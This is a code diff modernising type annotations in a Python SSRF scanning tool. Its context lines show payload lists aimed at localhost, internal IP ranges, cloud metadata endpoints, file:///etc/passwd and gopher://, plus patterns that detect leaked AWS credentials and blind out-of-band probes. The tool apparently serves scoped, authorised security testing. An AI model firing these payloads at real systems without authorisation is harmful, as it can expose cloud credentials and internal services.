@@ -72,8 +72,8 @@ from __future__ import annotations
 
 import re
 import time
-from typing import Any, Dict, List, Optional, Tuple
-from urllib.parse import urlparse, urlencode, parse_qsl, urlsplit, urlunsplit
+from typing import Any
+from urllib.parse import urlencode, parse_qsl, urlsplit, urlunsplit
 
 import requests
 
@@ -93,7 +93,7 @@ _BASELINE_URL = "http://example.com/"
 
 # --- payload battery --------------------------------------------------------
 
-_LOCALHOST_PAYLOADS: Tuple[str, ...] = (
+_LOCALHOST_PAYLOADS: tuple[str, ...] = (
     "http://127.0.0.1/",
     "http://127.0.0.1:22/",
     "http://127.0.0.1:80/",
@@ -104,7 +104,7 @@ _LOCALHOST_PAYLOADS: Tuple[str, ...] = (
     "http://127.1/",
 )
 
-_INTERNAL_PAYLOADS: Tuple[str, ...] = (
+_INTERNAL_PAYLOADS: tuple[str, ...] = (
     "http://192.168.0.1/",
     "http://10.10.10.1/",
     "http://172.16.0.1/",
@@ -115,7 +115,7 @@ _INTERNAL_PAYLOADS: Tuple[str, ...] = (
     "http://metadata.azure.com/",
 )
 
-_SCHEME_PAYLOADS: Tuple[str, ...] = (
+_SCHEME_PAYLOADS: tuple[str, ...] = (
     "file:///etc/passwd",
     "file:///etc/hostname",
     "gopher://127.0.0.1:25/",
@@ -126,7 +126,7 @@ _SCHEME_PAYLOADS: Tuple[str, ...] = (
 
 # --- detection signatures ---------------------------------------------------
 
-_METADATA_PATTERNS: Tuple[Tuple[str, str], ...] = (
+_METADATA_PATTERNS: tuple[tuple[str, str], ...] = (
     ("aws_ami_id", r"\bami-[0-9a-f]{8,}\b"),
     ("aws_instance_id", r"\bi-[0-9a-f]{8,}\b"),
     ("aws_security_credentials", r"SecurityCredentials|AccessKeyId|SecretAccessKey|Token"),
@@ -137,7 +137,7 @@ _METADATA_PATTERNS: Tuple[Tuple[str, str], ...] = (
 )
 _PASSWD_LINE = re.compile(r"^(?:root|daemon|bin|nobody):[x*]:\d+:\d*:", re.MULTILINE)
 
-_ERROR_PATTERNS: Tuple[str, ...] = (
+_ERROR_PATTERNS: tuple[str, ...] = (
     "couldn't connect", "connection refused", "failed to connect",
     "getaddrinfo", "curl error", "name resolution", "no address",
     "network is unreachable", "connection timed out",
@@ -149,8 +149,8 @@ _TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.IGNORECASE | re.DOTALL)
 
 # --- helpers ----------------------------------------------------------------
 
-def _inject(url: str, payload: str, param: Optional[str], method: str,
-            body: Optional[str]) -> Tuple[str, Optional[str], Optional[Dict[str, str]]]:
+def _inject(url: str, payload: str, param: str | None, method: str,
+            body: str | None) -> tuple[str, str | None, dict[str, str] | None]:
     """Return (final_url, data, json) with the payload substituted.
 
     Substitution order: if ``FUZZ`` token is present in the URL (and/or
@@ -183,8 +183,8 @@ def _inject(url: str, payload: str, param: Optional[str], method: str,
     return url, data, json_body
 
 
-def _signature(resp: Optional[requests.Response], elapsed: float,
-               err: str) -> Dict[str, Any]:
+def _signature(resp: requests.Response | None, elapsed: float,
+               err: str) -> dict[str, Any]:
     """Compact response signature for anomaly comparison."""
     if resp is None:
         return {"status": None, "length": None, "elapsed": round(elapsed, 3),
@@ -200,8 +200,8 @@ def _signature(resp: Optional[requests.Response], elapsed: float,
     }
 
 
-def _detect_reflection(body: str) -> List[Dict[str, str]]:
-    hits: List[Dict[str, str]] = []
+def _detect_reflection(body: str) -> list[dict[str, str]]:
+    hits: list[dict[str, str]] = []
     low = body
     for label, pat in _METADATA_PATTERNS:
         m = re.search(pat, low, re.IGNORECASE)
@@ -212,12 +212,12 @@ def _detect_reflection(body: str) -> List[Dict[str, str]]:
     return hits
 
 
-def _detect_errors(body: str) -> List[str]:
+def _detect_errors(body: str) -> list[str]:
     low = body.lower()
     return [e for e in _ERROR_PATTERNS if e in low]
 
 
-def _try_collab() -> Optional[Any]:
+def _try_collab() -> Any | None:
     """Return a (generate_fn, poll_fn) pair if the collaborator is running."""
     try:
         from listeners.collaborator import _get_collab  # noqa: F401
@@ -228,7 +228,7 @@ def _try_collab() -> Optional[Any]:
         return None
 
 
-def _scan_config() -> Tuple[Dict[str, str], Optional[float]]:
+def _scan_config() -> tuple[dict[str, str], float | None]:
     """Program-mandated identification headers + rate cap (no args).
 
     Resolves from the operator-ARMED scope state via
@@ -280,7 +280,7 @@ def scan_ssrf(
     timeout: float = _PER_PAYLOAD_TIMEOUT,
     max_payloads: int = _MAX_PAYLOADS,
     delay: float = 0.0,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Probe ``target`` for SSRF across the payload battery.
 
     Args:
@@ -337,10 +337,10 @@ def scan_ssrf(
 
     started = time.time()
     collab = _try_collab()
-    blind_payloads: List[Tuple[str, str]] = []  # (id, payload_url)
+    blind_payloads: list[tuple[str, str]] = []  # (id, payload_url)
 
     # Build the payload list with per-payload ids for OOB correlation.
-    payloads: List[Dict[str, Any]] = []
+    payloads: list[dict[str, Any]] = []
 
     def _add(category: str, value: str, pid: str = "") -> None:
         payloads.append({"category": category, "value": value, "id": pid})
@@ -386,7 +386,7 @@ def scan_ssrf(
         sub_dns = f"{collab_id}d"
         if collab_public_base:
             # Public (funnel) mode: single public host, path-based ids.
-            blind: Tuple[Tuple[str, str], ...] = (
+            blind: tuple[tuple[str, str], ...] = (
                 (sub_http, f"{collab_public_base}/c/{sub_http}/"),
                 (sub_dns, f"{collab_public_base}/c/{sub_dns}/"),
             )
@@ -421,7 +421,7 @@ def scan_ssrf(
     payloads = payloads[: max(1, int(max_payloads))]
 
     # Baseline: a benign external URL to capture a "normal" signature.
-    baseline_sig: Optional[Dict[str, Any]] = None
+    baseline_sig: dict[str, Any] | None = None
     try:
         b_url, b_data, b_json = _inject(target, _BASELINE_URL, param or None,
                                         method, body or None)
@@ -438,7 +438,7 @@ def scan_ssrf(
         baseline_sig = _signature(None, 0.0, f"baseline_failed:{type(e).__name__}")
 
     # Fire each payload.
-    results: List[Dict[str, Any]] = []
+    results: list[dict[str, Any]] = []
     last_sent_ts = 0.0
     for i, p in enumerate(payloads):
         if eff_delay > 0 and i > 0:
@@ -493,7 +493,7 @@ def scan_ssrf(
         last_sent_ts = time.time()
 
     # Blind confirmation: poll the collaborator after a settle delay.
-    blind_hits: List[Dict[str, Any]] = []
+    blind_hits: list[dict[str, Any]] = []
     if not collab_unavailable and collab is not None and blind_payloads:
         time.sleep(_SETTLE_DELAY)
         try:
@@ -520,7 +520,7 @@ def scan_ssrf(
             })
 
     # Verdict / severity aggregation.
-    verdicts: List[Dict[str, Any]] = []
+    verdicts: list[dict[str, Any]] = []
     for r in results:
         if r["reflection"]:
             kinds = [h["kind"] for h in r["reflection"]]
@@ -550,7 +550,7 @@ def scan_ssrf(
 
     # Dedupe verdicts by (verdict, payload).
     seen = set()
-    deduped: List[Dict[str, Any]] = []
+    deduped: list[dict[str, Any]] = []
     for v in verdicts:
         key = (v.get("verdict", ""), v.get("payload", ""))
         if key in seen:
